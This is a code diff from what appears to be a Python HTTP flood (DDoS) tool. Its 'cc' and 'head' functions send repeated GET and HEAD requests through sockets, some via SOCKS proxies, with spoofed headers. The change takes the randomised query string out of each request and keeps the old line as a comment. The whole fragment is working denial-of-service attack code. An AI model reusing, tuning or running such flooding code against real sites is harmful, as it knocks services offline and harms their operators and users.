@@ -162,7 +162,8 @@ def cc(event,socks_type):
 				s = ctx.wrap_socket(s,server_hostname=ip)
 			try:
 				for _ in range(multiple):
-					get_host = "GET " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					#get_host = "GET " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 					request = get_host + referer + useragent + accept + connection +"\r\n"
 					s.send(str.encode(request))
 			except:
@@ -195,7 +196,8 @@ def head(event,socks_type):#HEAD MODE
 				s = ctx.wrap_socket(s,server_hostname=ip)
 			try:
 				for _ in range(multiple):
-					head_host = "HEAD " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					#head_host = "HEAD " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					head_host = "HEAD " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 					request = head_host + referer + useragent + accept + connection +"\r\n"
 					s.send(str.encode(request))
 			except:
